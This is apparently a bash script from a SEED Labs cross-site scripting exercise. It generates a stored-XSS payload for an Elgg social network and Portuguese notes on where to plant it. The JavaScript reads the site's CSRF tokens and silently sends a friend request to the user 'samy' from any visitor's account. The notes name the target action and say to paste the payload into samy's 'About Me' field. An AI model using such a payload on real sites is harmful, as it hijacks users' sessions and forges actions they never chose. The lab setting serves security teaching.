#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")"

cat > task4_add_friend.html <<'EOF'
<script type="text/javascript">
window.onload = function () {
  var samyGuid = 59;
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
  var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;

  var ajax = new XMLHttpRequest();
  ajax.open("GET", sendurl, true);
  ajax.send();
};
</script>
EOF

cat > task4_notas.txt <<'EOF'
URL alvo: http://www.seed-server.com/action/friends/add
Metodo: GET
Parametro friend: 59
Parametros obrigatorios: __elgg_ts e __elgg_token
Local para colar o payload: campo "About Me" do utilizador samy, em modo Text/HTML
EOF

printf 'Gerados: task4_add_friend.html, task4_notas.txt\n'
